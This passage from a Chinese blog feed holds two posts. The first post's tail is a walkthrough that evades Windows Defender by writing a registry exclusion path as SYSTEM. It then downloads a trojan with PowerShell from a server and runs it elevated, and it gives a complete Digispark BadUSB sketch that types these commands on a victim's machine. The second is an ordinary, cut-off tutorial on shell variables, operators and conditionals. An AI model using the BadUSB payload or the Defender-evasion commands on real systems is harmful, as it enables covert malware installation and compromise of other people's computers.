可以看到，不同于配置信息在policies文件夹下，此配置在softwarew文件夹下，因此不受到Tamper Protection的控制，我们可以直接通过命令修改该排除项（当然，要保持在nt authority\system权限下，具体方法可以参看上一部分），使用如下命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AdvancedRun.exe /EXEFilename <span class="string">&quot;c:\windows\system32\cmd.exe&quot;</span> /RunAs <span class="number">8</span> /Run</span><br><span class="line"></span><br><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths&quot;</span> /v <span class="string">&quot;c:\1_wua&quot;</span> /d <span class="number">0</span> /t REG_DWORD /f</span><br></pre></td></tr></table></figure><h3 id="4、完整思路"><a href="#4、完整思路" class="headerlink" title="4、完整思路"></a>4、完整思路</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建排除项文件夹</span></span><br><span class="line"><span class="built_in">md</span> C:\<span class="number">1</span>_wua</span><br><span class="line"><span class="comment">#切换到排除项目录下</span></span><br><span class="line"><span class="built_in">cd</span> C:\<span class="number">1</span>_wua</span><br><span class="line"><span class="comment">#下载提权脚本</span></span><br><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.0.1/tools/ar.exe&#x27;</span>,<span class="string">&#x27;AdvancedRun.exe&#x27;</span>)</span><br><span class="line"><span class="comment">#提权运行新的cmd</span></span><br><span class="line">AdvancedRun.exe /EXEFilename <span class="string">&quot;c:\windows\system32\cmd.exe&quot;</span> /RunAs <span class="number">8</span> /Run</span><br><span class="line"><span class="comment">#添加排除项到排除项目录</span></span><br><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths&quot;</span> /v <span class="string">&quot;c:\1_wua&quot;</span> /d <span class="number">0</span> /t REG_DWORD /f</span><br><span class="line"><span class="comment">#切换到排除项目录下</span></span><br><span class="line"><span class="built_in">cd</span> C:\<span class="number">1</span>_wua</span><br><span class="line"><span class="comment">#使用powershell下载木马文件</span></span><br><span class="line">powershell (<span class="built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.0.1/tools/sl.exe&#x27;</span>,<span class="string">&#x27;HKLHhost.exe&#x27;</span>)</span><br><span class="line"><span class="comment">#提权运行木马文件，防止进程被意外杀死</span></span><br><span class="line">AdvancedRun.exe /EXEFilename <span class="string">&quot;c:\1_wua\HKLHhost.exe&quot;</span> /RunAs <span class="number">8</span> /Run</span><br></pre></td></tr></table></figure><h2 id="三、badusb脚本编写"><a href="#三、badusb脚本编写" class="headerlink" title="三、badusb脚本编写"></a>三、badusb脚本编写</h2><ul><li><p>安装 arduino 的 IDE。 下载地址：<a href="https://www.arduino.cc/en/Main/Software">https://www.arduino.cc/en/Main/Software</a> 新版下载：<a href="https://downloads.arduino.cc/arduino-1.8.3-windows.zi">https://downloads.arduino.cc/arduino-1.8.3-windows.zi</a></p></li><li><p>安装驱动DPinst64.exe，自行搜索即可</p></li><li><p>首选项附加开发板管理器网址：<a href="http://digistump.com/package_digistump_index.json">http://digistump.com/package_digistump_index.json</a></p></li><li><p>选择对应的驱动类型（Digispark）和编程器（tinyUSBIsp）</p></li></ul><p>略过脚本编写过程，具体需要按照开发板类型自行调整：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">//www.huapidan.com QQ&amp;WeChate:<span class="number">1499259</span></span><br><span class="line"><span class="comment">#include &quot;DigiKeyboard.h&quot;</span></span><br><span class="line"><span class="comment">#define KEY_ESC     41</span></span><br><span class="line"><span class="comment">#define KEY_BACKSPACE 42</span></span><br><span class="line"><span class="comment">#define KEY_TAB     43</span></span><br><span class="line"><span class="comment">#define KEY_PRT_SCR 70</span></span><br><span class="line"><span class="comment">#define KEY_DELETE  76</span></span><br><span class="line"></span><br><span class="line">void setup() &#123;</span><br><span class="line"></span><br><span class="line">DigiKeyboard.delay(<span class="number">5000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">0</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;md C:&quot;</span>)); DigiKeyboard.<span class="built_in">print</span>(char(<span class="number">92</span>)); DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;1_wua&quot;</span>));</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;cd C:&quot;</span>)); DigiKeyboard.<span class="built_in">print</span>(char(<span class="number">92</span>)); DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;1_wua&quot;</span>));</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;powershell (new-object System.Net.WebClient).DownloadFile(&#x27;http://192.168.0.1/tools/ar.exe&#x27;,&#x27;AdvancedRun.exe&#x27;)&quot;</span>));</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.delay(<span class="number">5000</span>);</span><br><span class="line">DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;AdvancedRun.exe /EXEFilename &quot;</span>)); DigiKeyboard.<span class="built_in">print</span>(char(<span class="number">34</span>)); DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;c:&quot;</span>)); DigiKeyboard.<span class="built_in">print</span>(char(<span class="number">92</span>)); DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;windows&quot;</span>)); DigiKeyboard.<span class="built_in">print</span>(char(<span class="number">92</span>)); DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;system32&quot;</span>)); DigiKeyboard.<span class="built_in">print</span>(char(<span class="number">92</span>)); DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;cmd.exe&quot;</span>)); DigiKeyboard.<span class="built_in">print</span>(char(<span class="number">34</span>)); DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot; /RunAs 8 /Run&quot;</span>));</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.delay(<span class="number">1000</span>);</span><br><span class="line">DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;reg add &quot;</span>)); DigiKeyboard.<span class="built_in">print</span>(char(<span class="number">34</span>)); DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;HKEY_LOCAL_MACHINE&quot;</span>)); DigiKeyboard.<span class="built_in">print</span>(char(<span class="number">92</span>)); DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;SOFTWARE&quot;</span>)); DigiKeyboard.<span class="built_in">print</span>(char(<span class="number">92</span>)); DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;Microsoft&quot;</span>)); DigiKeyboard.<span class="built_in">print</span>(char(<span class="number">92</span>)); DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;Windows Defender&quot;</span>)); DigiKeyboard.<span class="built_in">print</span>(char(<span class="number">92</span>)); DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;Exclusions&quot;</span>)); DigiKeyboard.<span class="built_in">print</span>(char(<span class="number">92</span>)); DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;Paths&quot;</span>)); DigiKeyboard.<span class="built_in">print</span>(char(<span class="number">34</span>)); DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot; /v &quot;</span>)); DigiKeyboard.<span class="built_in">print</span>(char(<span class="number">34</span>)); DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;c:&quot;</span>)); DigiKeyboard.<span class="built_in">print</span>(char(<span class="number">92</span>)); DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;1_wua&quot;</span>)); DigiKeyboard.<span class="built_in">print</span>(char(<span class="number">34</span>)); DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot; /d 0 /t REG_DWORD /f&quot;</span>));</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;cd C:&quot;</span>)); DigiKeyboard.<span class="built_in">print</span>(char(<span class="number">92</span>)); DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;1_wua&quot;</span>));</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;powershell (new-object System.Net.WebClient).DownloadFile(&#x27;http://92.168.0.1/tools/sl.exe&#x27;,&#x27;HKLHhost.exe&#x27;)&quot;</span>));</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.delay(<span class="number">5000</span>);</span><br><span class="line">DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;AdvancedRun.exe /EXEFilename &quot;</span>)); DigiKeyboard.<span class="built_in">print</span>(char(<span class="number">34</span>)); DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;c:&quot;</span>)); DigiKeyboard.<span class="built_in">print</span>(char(<span class="number">92</span>)); DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;1_wua&quot;</span>)); DigiKeyboard.<span class="built_in">print</span>(char(<span class="number">92</span>)); DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;HKLHhost.exe&quot;</span>)); DigiKeyboard.<span class="built_in">print</span>(char(<span class="number">34</span>)); DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot; /RunAs 8 /Run&quot;</span>));</span><br><span class="line">DigiKeyboard.delay(<span class="number">1000</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.<span class="built_in">print</span>(F(<span class="string">&quot;you are fucked!&quot;</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void loop() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="四、参考文献"><a href="#四、参考文献" class="headerlink" title="四、参考文献"></a>四、参考文献</h2><p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-Windows-Defender">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-Windows-Defender</a></p><p><a href="https://www.freebuf.com/articles/network/324952.html">https://www.freebuf.com/articles/network/324952.html</a></p>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>shell入门</title>
      <link href="/2022/08/18/shell%E5%85%A5%E9%97%A8/"/>
      <url>/2022/08/18/shell%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="shell入门"><a href="#shell入门" class="headerlink" title="shell入门"></a>shell入门</h1><p>教程摘录自菜鸟教程，仅供自行学习加深记忆，请参看：<a href="https://www.runoob.com/linux/linux-shell-variable.html">https://www.runoob.com/linux/linux-shell-variable.html</a></p><p>记得写：*#!/bin/bash*</p><h2 id="0x01-变量"><a href="#0x01-变量" class="headerlink" title="0x01 变量"></a>0x01 变量</h2><p>​    字母数字下划线，使用赋值语句(不能含有空格)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your_name=&quot;runoob.com&quot;</span><br></pre></td></tr></table></figure><p>​    在使用变量时，可以使用如下方法，效果相等，后者用于字符串拼接场景：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $your_name</span><br><span class="line">echo $&#123;your_name&#125;</span><br></pre></td></tr></table></figure><p>​    使用unset your_name来删除变量。</p><h3 id="一、字符串"><a href="#一、字符串" class="headerlink" title="一、字符串"></a>一、字符串</h3><p><strong>单引号</strong>为原样字符串，所有输出均为原样，没有变量和转义。</p><p><strong>双引号</strong>中可以引入“\”符号作为转义符号，也可以直接插入变量进行拼接。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">使用双引号拼接</span></span><br><span class="line">greeting=&quot;hello, &quot;$your_name&quot; !&quot;</span><br><span class="line">greeting_1=&quot;hello, $&#123;your_name&#125; !&quot;</span><br><span class="line">echo $greeting  $greeting_1</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用单引号拼接</span></span><br><span class="line">greeting_2=&#x27;hello, &#x27;$your_name&#x27; !&#x27;</span><br><span class="line">greeting_3=&#x27;hello, $&#123;your_name&#125; !&#x27;</span><br><span class="line">echo $greeting_2  $greeting_3</span><br></pre></td></tr></table></figure><p>输出为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello, runoob ! hello, runoob !</span><br><span class="line">hello, runoob ! hello, $&#123;your_name&#125; !</span><br></pre></td></tr></table></figure><p><strong>获取长度</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string=&quot;abcd&quot;</span><br><span class="line">echo $&#123;#string&#125;   # 输出 4</span><br></pre></td></tr></table></figure><p><strong>提取子串</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string=&quot;runoob is a great site&quot;</span><br><span class="line">echo $&#123;string:1:4&#125; # 输出 unoo</span><br></pre></td></tr></table></figure><h3 id="二、数组"><a href="#二、数组" class="headerlink" title="二、数组"></a>二、数组</h3><p>bash支持数组</p><p><strong>定义数组</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_name=(value0 value1 value2 value3)</span><br></pre></td></tr></table></figure><p><strong>读取数组</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">valuen=$&#123;array_name[n]&#125;</span><br></pre></td></tr></table></figure><p><strong>使用所有元素</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;数组的元素为: $&#123;my_array[*]&#125;&quot;</span><br><span class="line">echo &quot;数组的元素为: $&#123;my_array[@]&#125;&quot;</span><br></pre></td></tr></table></figure><p><strong>数组长度</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;数组元素个数为: $&#123;#my_array[*]&#125;&quot;</span><br></pre></td></tr></table></figure><h3 id="三、注释"><a href="#三、注释" class="headerlink" title="三、注释"></a>三、注释</h3><p>单行为：#</p><p>多行为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">:&lt;&lt;EOF</span><br><span class="line">注释内容...</span><br><span class="line">注释内容...</span><br><span class="line">注释内容...</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">:&lt;&lt;!</span><br><span class="line">注释内容...</span><br><span class="line">注释内容...</span><br><span class="line">注释内容...</span><br><span class="line">!</span><br></pre></td></tr></table></figure><h3 id="四、参数"><a href="#四、参数" class="headerlink" title="四、参数"></a>四、参数</h3><p>脚本传参为$n格式，n为数字。</p><p>$0表示脚本文件名，$1之后均为参数，自左始。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ chmod +x test.sh </span><br><span class="line">$ ./test.sh 1 2 3</span><br><span class="line">Shell 传递参数实例！</span><br><span class="line">执行的文件名：./test.sh</span><br><span class="line">第一个参数为：1</span><br><span class="line">第二个参数为：2</span><br><span class="line">第三个参数为：3</span><br></pre></td></tr></table></figure><p><strong>其他参数：</strong></p><table><thead><tr><th>参数处理</th><th>说明</th></tr></thead><tbody><tr><td>$#</td><td>传递到脚本的参数个数</td></tr><tr><td>$*</td><td>字符串显示所有向脚本传递的所有参数</td></tr><tr><td>$$</td><td>脚本运行的当前进程ID号</td></tr><tr><td>$!</td><td>后台运行的最后一个进程的ID号</td></tr><tr><td>$?</td><td>显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。</td></tr></tbody></table><h2 id="0x02-基本运算"><a href="#0x02-基本运算" class="headerlink" title="0x02 基本运算"></a>0x02 基本运算</h2><h3 id="一、数字运算"><a href="#一、数字运算" class="headerlink" title="一、数字运算"></a>一、数字运算</h3><p>shell对字符串友好，对基本运算不太友好，基本运算一般通过expr实现。</p><p>要使用常见的<strong>加减乘除余</strong>，需要遵循如下语法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">val=`expr $a + $b`</span><br><span class="line">echo &quot;a + b : $val&quot;</span><br><span class="line"></span><br><span class="line">val=`expr $a - $b`</span><br><span class="line">echo &quot;a - b : $val&quot;</span><br><span class="line"></span><br><span class="line">val=`expr $a \* $b`</span><br><span class="line">echo &quot;a * b : $val&quot;</span><br><span class="line"></span><br><span class="line">val=`expr $b / $a`</span><br><span class="line">echo &quot;b / a : $val&quot;</span><br><span class="line"></span><br><span class="line">val=`expr $b % $a`</span><br><span class="line">echo &quot;b % a : $val&quot;</span><br></pre></td></tr></table></figure><p>有几个阴间非常的重点需要注意：</p><ul><li>使用的引号不是正常引号 ‘，而是<strong>反引号</strong>`</li><li>变量和运算符之间，一定要有<strong>空格</strong>，即，必须是2 + 2，不能是2+2</li><li>使用<strong>乘法</strong>需要转义</li></ul><p>这个过于阴间了，我个人认为，应该使用let就可以了，语法为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=3</span><br><span class="line">b=2</span><br><span class="line">let &quot;c=a+b&quot;</span><br><span class="line">let &quot;d=a*b&quot;</span><br><span class="line">echo $c $d</span><br></pre></td></tr></table></figure><p>甚至不需要空格，也不需要转义</p><h3 id="二、数据读入"><a href="#二、数据读入" class="headerlink" title="二、数据读入"></a>二、数据读入</h3><p>直接使用read：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;please input&quot;</span><br><span class="line">read input</span><br><span class="line">echo &quot;input is $input&quot;</span><br></pre></td></tr></table></figure><h2 id="0x03-流程控制"><a href="#0x03-流程控制" class="headerlink" title="0x03 流程控制"></a>0x03 流程控制</h2><h3 id="一、if语句"><a href="#一、if语句" class="headerlink" title="一、if语句"></a>一、if语句</h3><p>直接上示例吧：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">a=10</span><br><span class="line">b=20</span><br><span class="line">if [ $a == $b ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;a 等于 b&quot;</span><br><span class="line">elif [ $a -gt $b ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;a 大于 b&quot;</span><br><span class="line">elif [ $a -lt $b ]</span><br><span class="line">then</span><br><span class="line">   echo &quot;a 小于 b&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;没有符合的条件&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">a=10</span><br><span class="line">b=20</span><br><span class="line">if (( $a == $b ))</span><br><span class="line">then</span><br><span class="line">   echo &quot;a 等于 b&quot;</span><br><span class="line">elif (( $a &gt; $b ))</span><br><span class="line">then</span><br><span class="line">   echo &quot;a 大于 b&quot;</span><br><span class="line">elif (( $a &lt; $b ))</span><br><span class="line">then</span><br><span class="line">   echo &quot;a 小于 b&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;没有符合的条件&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>if else 的 <strong>[…]</strong> 判断语句中大于使用 <strong>-gt</strong>，小于使用 <strong>-lt</strong>。</p><p>如果使用 <strong>((…))</strong> 作为判断语句，大于和小于可以直接使用 <strong>&gt;</strong> 和 **&lt;**。</p><h4 id="1-判断数字逻辑（用在-中）"><a href="#1-判断数字逻辑（用在-中）" class="headerlink" title="1.判断数字逻辑（用在[]中）"></a>1.判断数字逻辑（用在[]中）</h4><table><thead><tr><th align="left">运算符</th><th align="left">说明</th><th align="left">举例</th></tr></thead><tbody><tr><td align="left"><strong>-eq</strong></td><td align="left">检测两个数是否相等，相等返回 true。</td><td align="left">[ $a -eq $b ] 返回 false。</td></tr><tr><td align="left"><strong>-ne</strong></td><td align="left">检测两个数是否不相等，不相等返回 true。</td><td align="left">[ $a -ne $b ] 返回 true。</td></tr><tr><td align="left"><strong>-gt</strong></td><td align="left">检测左边的数是否大于右边的，如果是，则返回 true。</td><td align="left">[ $a -gt $b ] 返回 false。</td></tr><tr><td align="left"><strong>-lt</strong></td><td align="left">检测左边的数是否小于右边的，如果是，则返回 true。</td><td align="left">[ $a -lt $b ] 返回 true。</td></tr><tr><td align="left"><strong>-ge</strong></td><td align="left">检测左边的数是否大于等于右边的，如果是，则返回 true。</td><td align="left">[ $a -ge $b ] 返回 false。</td></tr><tr><td align="left"><strong>-le</strong></td><td align="left">检测左边的数是否小于等于右边的，如果是，则返回 true。</td><td align="left">[ $a -le $b ] 返回 true。</td></tr></tbody></table><p><strong>布尔运算</strong></p><table><thead><tr><th align="left">运算符</th><th align="left">说明</th><th align="left">举例</th></tr></thead><tbody><tr><td align="left">!</td><td align="left">非运算，表达式为 true 则返回 false，否则返回 true。</td><td align="left">[ ! false ] 返回 true。</td></tr><tr><td align="left">-o</td><td align="left">或运算，有一个表达式为 true 则返回 true。</td><td align="left">[ $a -lt 20 -o $b -gt 100 ] 返回 true。</td></tr><tr><td align="left">-a</td><td align="left">与运算，两个表达式都为 true 才返回 true。</td><td align="left">[ $a -lt 20 -a $b -gt 100 ] 返回 false。</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if [ $a -lt 100 -o $b -gt 100 ] #表示a小于一百或b大于一百</span><br></pre></td></tr></table></figure><h4 id="2-字符串逻辑（）"><a href="#2-字符串逻辑（）" class="headerlink" title="2.字符串逻辑（）"></a>2.字符串逻辑（）</h4><table><thead><tr><th align="left">运算符</th><th align="left">说明</th><th align="left">举例</th></tr></thead><tbody><tr><td align="left">=</td><td align="left">检测两个字符串是否相等，相等返回 true。</td><td align="left">[ $a = $b ] 返回 false。</td></tr><tr><td align="left">!=</td><td align="left">检测两个字符串是否不相等，不相等返回 true。</td><td align="left">[ $a != $b ] 返回 true。</td></tr><tr><td align="left">-z</td><td align="left">检测字符串长度是否为0，为0返回 true。</td><td align="left">[ -z $a ] 返回 false。</td></tr><tr><td align="left">-n</td><td align="left">检测字符串长度是否不为 0，不为 0 返回 true。</td><td align="left">[ -n “$a” ] 返回 true。</td></tr><tr><td align="left">$</td><td align="left">检测字符串是否不为空，不为空返回 true。</td><td align="left">[ $a ] 返回 true。</td></tr></tbody></table><p>使用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if [ $a = $b ]</span><br></pre></td></tr></table></figure><h4 id="3-文件逻辑"><a href="#3-文件逻辑" class="headerlink" title="3.文件逻辑"></a>3.文件逻辑</h4><table><thead><tr><th align="left">操作符</th><th align="left">说明</th><th align="left">举例</th></tr></thead><tbody><tr><td align="left">-b file</td><td align="left">检测文件是否是块设备文件，如果是，则返回 true。</td><td align="left">[ -b $file ] 返回 false。</td></tr><tr><td align="left">-c file</td><td align="left">检测文件是否是字符设备文件，如果是，则返回 true。</td><td align="left">[ -c $file ] 返回 false。</td></tr><tr><td align="left">-d file</td><td align="left">检测文件是否是目录，如果是，则返回 true。</td><td align="left">[ -d $file ] 返回 false。</td></tr><tr><td align="left">-f file</td><td align="left">检测文件是否是普通文件（既不是目录，也不是设备文件），如果是，则返回 true。</td><td align="left">[ -f $file ] 返回 true。</td></tr><tr><td align="left">-g file</td><td align="left">检测文件是否设置了 SGID 位，如果是，则返回 true。</td><td align="left">[ -g $file ] 返回 false。</td></tr><tr><td align="left">-k file</td><td align="left">检测文件是否设置了粘着位(Sticky Bit)，如果是，则返回 true。</td><td align="left">[ -k $file ] 返回 false。</td></tr><tr><td align="left">-p file</td><td align="left">检测文件是否是有名管道，如果是，则返回 true。</td><td align="left">[ -p $file ] 返回 false。</td></tr><tr><td align="left">-u file</td><td align="left">检测文件是否设置了 SUID 位，如果是，则返回 true。</td><td align="left">[ -u $file ] 返回 false。</td></tr><tr><td align="left">-r file</td><td align="left">检测文件是否可读，如果是，则返回 true。</td><td align="left">[ -r $file ] 返回 true。</td></tr><tr><td align="left">-w file</td><td align="left">检测文件是否可写，如果是，则返回 true。</td><td align="left">[ -w $file ] 返回 true。</td></tr><tr><td align="left">-x file</td><td align="left">检测文件是否可执行，如果是，则返回 true。</td><td align="left">[ -x $file ] 返回 true。</td></tr><tr><td align="left">-s file</td><td align="left">检测文件是否为空（文件大小是否大于0），不为空返回 true。</td><td align="left">[ -s $file ] 返回 true。</td></tr><tr><td align="left">-e file</td><td align="left">检测文件（包括目录）是否存在，如果是，则返回 true。</td><td align="left">[ -e $file ] 返回 